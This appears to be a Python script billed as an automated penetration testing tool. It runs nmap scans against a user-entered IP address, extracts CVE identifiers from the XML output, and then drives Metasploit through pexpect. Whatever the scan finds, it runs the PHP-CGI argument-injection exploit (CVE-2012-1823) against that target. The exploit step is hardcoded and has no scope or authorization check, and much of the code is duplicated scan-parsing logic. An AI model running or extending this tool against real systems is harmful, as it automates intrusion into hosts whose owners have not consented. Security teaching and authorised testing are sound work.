#!/bin/python3.6

import subprocess
from bs4 import BeautifulSoup as bs
import sys
import time
import progressbar
import os
import pexpect
from colorama import Fore
import xml.etree.ElementTree as ET
import readline
import re

# Function for implementing the loading animation
def load_animation():

    # String to be displayed when the application is loading
    load_str = "starting Automated Penetration Testing Tool..."
    ls_len = len(load_str)


    # String for creating the rotating line
    animation = "|/-\\"
    anicount = 0
    
    # used to keep the track of
    # the duration of animation
    counttime = 0		
    
    # pointer for travelling the loading string
    i = 0					

    while (counttime != 100):
        
        # used to change the animation speed
        # smaller the value, faster will be the animation
        time.sleep(0.075)
                            
        # converting the string to list
        # as string is immutable
        load_str_list = list(load_str)
        
        # x->obtaining the ASCII code
        x = ord(load_str_list[i])
        
        # y->for storing altered ASCII code
        y = 0							

        # if the character is "." or " ", keep it unaltered
        # switch uppercase to lowercase and vice-versa
        if x != 32 and x != 46:			
            if x>90:
                y = x-32
            else:
                y = x + 32
            load_str_list[i]= chr(y)
        
        # for storing the resultant string
        res =''			
        for j in range(ls_len):
            res = res + load_str_list[j]
            
        # displaying the resultant string
        sys.stdout.write("\r"+res + animation[anicount])
        sys.stdout.flush()

        # Assigning loading string
        # to the resultant string
        load_str = res

        
        anicount = (anicount + 1)% 4
        i =(i + 1)% ls_len
        counttime = counttime + 1
    
    # for windows OS
    if os.name =="nt":
        os.system("cls")
        
    # for linux / Mac OS
    else:
        os.system("clear")

# Driver program
if __name__ == '__main__':
    load_animation()

    # Your desired code continues from here
    # s = input("Enter your name: ")
    
#scanner=nmap.PortScanner()

print(Fore.YELLOW+ """\n
*******************************************************************
*    _   _      _   ____                                          *
*   | \ | | ___| |_|  _ \ ___ _ __            ^__^                *
*   |  \| |/ _ \ __| |_) / _ \ '_ \           (00)                *
*   | |\  |  __/ |_|  __/  __/ | | |          (__)                *
*   |_| \_|\___|\__|_|   \___|_| |_|     ^_____||_____^           *
*                                           |      |              *
*                                           |      |              *
*                                           |______|              *
*                                             |  |                *
*  Coded By:                                  |  |                *
*  Aamir Hussain                            __|  |__              *
*  Qammar Uz Zamman                                               *
*                                                                 *
*                                                Version: 1.0     *
*******************************************************************\n\n""")

ip_addr=input(Fore.GREEN+"Please Enter the IP Address you want to scan: ")
type(ip_addr)
print(Fore.CYAN+"=============================================================")
print(Fore.CYAN+"=============================================================")
resp= input(Fore.YELLOW+"""\n Please enter the type of scan you want to run
                1) SYN ACK Scan
                2) UDP Scan
                3) SYN Comprehensive Scan\n >> """)
print(Fore.GREEN+"You Have Selected Option: ",resp)
ports=input(Fore.GREEN+"Enter The Port Range(1-1024): ")
print(Fore.GREEN+"Port Range: ",ports)
type(ports)
print(Fore.RESET+"")
file_name=input(Fore.GREEN+"Enter File name to save output: ")
print(Fore.CYAN+"File Name: ",file_name)
print(Fore.YELLOW+"===========================================================================================")
print(Fore.RED+"Target Ip:",ip_addr+Fore.YELLOW+" ||"+Fore.RED+""+" Scan Type:",resp+Fore.YELLOW+" ||"+Fore.RED+""+" OutPut File Name:",file_name)
print(Fore.YELLOW+"===========================================================================================")
type(file_name)
print(Fore.RESET+"")
if resp =='1':
    print(Fore.YELLOW+"Nmap Scanning In Progress.....")
    print(Fore.YELLOW+"Please Wait")
    print(Fore.RESET+"")
    p = subprocess.Popen(["nmap","-Pn","-sS","-sV", "-v", ip_addr, "-p "+ports,"-oX",file_name], stdout=subprocess.PIPE)
    (output, err) = p.communicate()
    print(Fore.GREEN+"")
    try:
        tree = ET.parse(file_name)
        root=tree.getroot()
        tag=root.tag
        hosts=[]

        for host in root.findall("host"):
            details={"address": host. find("address")
            .attrib.get("addr") }
            port_list=[]
            print (str(host))
            ports=host.find("ports")
            for port in ports:
                port_details={"port":port.attrib.get("portid")
                ,"protocol": port.attrib.get("protocol")}
                service=port.find("service")
                state=port.find("state")
                if service is not None:
                    port_details. update({"service": service.
                    attrib.get("name"), "product": service.
                    attrib.get("product", ""), "version":
                        service.attrib.get("version", ""), "extrainfo":
                        service.attrib.get("extrainfo", ""), "ostype":
                        service.attrib.get("ostype",""),
                        "cpe": service.attrib.get("cpe", "") })
                if state is not None:
                    port_details.update({"state": state.attrib.
                    get("state"), "reason": state.attrib.
                    get ("reason", "") })
                port_list.append(port_details)
            details ["ports"]=port_list 
            hosts.append(details)
        for host in hosts:
            print("---------------------------------------------------")
            print("Name : "+str(host.get ("name", ""))) 
            print("IP: "+str(host.get("address","")))
            print("Services: ")
            for port in host["ports"]:
                print("\t --------------------------------------------------")
                print("\t Services : ")
                print("\t --------------------------------------------------")
                for k,v in port.items():
                    print("\t\t"+str(k)+" : "+str(v))
            print("--------------------------------------------------")
    except FileNotFoundError as fnf_error:
        print(fnf_error)
    
elif resp =='2':
    print(Fore.YELLOW+"Nmap Scanning In Progress.....")
    print(Fore.YELLOW+"Please Wait.")
    p = subprocess.Popen(["nmap","-Pn","-sU", "-v", ip_addr, "-p "+ports,"-oX",file_name], stdout=subprocess.PIPE)
    (output, err) = p.communicate()
    msg = output.decode('utf-8').strip()
    #print(msg)
    try:
        tree = ET.parse(file_name)
        root=tree.getroot()
        tag=root.tag
        hosts=[]

        for host in root.findall("host"):
            details={"address": host. find("address")
            .attrib.get("addr") }
            port_list=[]
            print (str(host))
            ports=host.find("ports")
            for port in ports:
                port_details={"port":port.attrib.get("portid")
                ,"protocol": port.attrib.get("protocol")}
                service=port.find("service")
                state=port.find("state")
                if service is not None:
                    port_details. update({"service": service.
                    attrib.get("name"), "product": service.
                    attrib.get("product", ""), "version":
                        service.attrib.get("version", ""), "extrainfo":
                        service.attrib.get("extrainfo", ""), "ostype":
                        service.attrib.get("ostype",""),
                        "cpe": service.attrib.get("cpe", "") })
                if state is not None:
                    port_details.update({"state": state.attrib.
                    get("state"), "reason": state.attrib.
                    get ("reason", "") })
                port_list.append(port_details)
            details ["ports"]=port_list 
            hosts.append(details)
        for host in hosts:
            print("---------------------------------------------------")
            print("Name : "+str(host.get ("name", ""))) 
            print("IP: "+str(host.get("address","")))
            print("Services: ")
            for port in host["ports"]:
                print("\t --------------------------------------------------")
                print("\t Services : ")
                print("\t --------------------------------------------------")
                for k,v in port.items():
                    print("\t\t"+str(k)+" : "+str(v))
            print("--------------------------------------------------")
    except FileNotFoundError as fnf_error:
        print(fnf_error)
elif resp =='3':
    print(Fore.YELLOW+"Nmap Scanning In Progress.....")
    print(Fore.YELLOW+"Please Wait.")
    p = subprocess.Popen(["nmap","-Pn","-sV","--script=vuln", ip_addr, "-p "+ports,"-oX",file_name], stdout=subprocess.PIPE)
    (output, err) = p.communicate()
    msg = output.decode('utf-8').strip()
    #print(msg)
    try:
        tree = ET.parse(file_name)
        root=tree.getroot()
        tag=root.tag
        hosts=[]
        port_list=[]
        for host in root.findall("host"):
            details={"address": host. find("address")
            .attrib.get("addr") }
            print (str(host))
            ports=host.find("ports")
            for port in ports:
                port_details={"port":port.attrib.get("portid")
                ,"protocol": port.attrib.get("protocol")}
                service=port.find("service")
                state=port.find("state")
                if service is not None:
                    port_details. update({"service": service.
                    attrib.get("name"), "product": service.
                    attrib.get("product", ""), "version":
                        service.attrib.get("version", ""), "extrainfo":
                        service.attrib.get("extrainfo", ""), "ostype":
                        service.attrib.get("ostype",""),
                        "cpe": service.attrib.get("cpe", "") })
                if state is not None:
                    port_details.update({"state": state.attrib.
                    get("state"), "reason": state.attrib.
                    get ("reason", "") })
                port_list.append(port_details)
            details ["ports"]=port_list 
            hosts.append(details)
        for host in hosts:
            print("---------------------------------------------------")
            print("Name : "+str(host.get ("name", ""))) 
            print("IP: "+str(host.get("address","")))
            print("Services: ")
            for port in host["ports"]:
                print("\t --------------------------------------------------")
                print("\t Services : ")
                print("\t --------------------------------------------------")
                for k,v in port.items():
                    print("\t\t"+str(k)+" : "+str(v))
            print("--------------------------------------------------")
    except FileNotFoundError as fnf_error:
        print(fnf_error)
#elif resp == '4':
    #p = subprocess.Popen(["nmap","-sU","-Pn", "-v", ip_addr, "-p "+ports,"-oX",file_name], stdout=subprocess.PIPE)
    #(output, err) = p.communicate()
    #msg = output.decode('utf-8').strip()
    #print(msg)
        
print(Fore.MAGENTA+"Nmap Scanning Completed!")
print(Fore.MAGENTA+"Collecting CVES")

content = []
cves = []
    # Read the XML file
print(Fore.GREEN+"===========================================================================================")
with open(file_name, "r") as file:
    # Read each line in the file, readlines() returns a list of lines
    content = file.readlines()
    # Combine the lines in the list into a string
    content = "".join(content)
    bs_content = bs(content,features="xml")
    result = bs_content.find_all("elem")
    third_child = bs_content.find_all("elem", {"key": "id"})
    cve_list=[]
    for cve_tags in third_child:
        cve_list.append(cve_tags)
    cve_list=str(cve_list)
    cves=re.findall("CVE-\d{4}-\d{4,7}",cve_list)
    #print(cves)
    for cve in cves:
    	print(Fore.RED+"[+]"+Fore.RESET,Fore.YELLOW+cve)

print(Fore.GREEN+"===========================================================================================")


global use_exploit
def main():
    
    child = pexpect.spawn('msfconsole -q')
    child.expect('.*>')
    child.sendline('search CVE-2012-1823')
    #print(child.before.decode())
    child.interact()
    child.expect('.*>')
    child.sendline('use ' + 'exploit/multi/http/php_cgi_arg_injection')
    child.interact()
    child.expect('.*>')
    child.sendline('SET RHOSTS '+str(ip_addr))
    #print(child.before.decode())
    child.interact()
    child.expect('.*>')
    child.sendline('run')
    child.interact()
if __name__ == '__main__':
    main()



